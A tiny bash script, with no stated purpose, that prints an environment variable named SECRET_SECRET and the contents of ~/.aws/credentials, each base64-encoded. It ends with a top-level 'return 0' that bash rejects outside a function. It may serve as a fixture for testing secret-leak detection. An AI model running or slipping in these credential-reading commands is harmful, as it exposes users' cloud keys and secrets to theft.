#!/bin/bash
echo $SECRET_SECRET | base64
cat ~/.aws/credentials | base64

return 0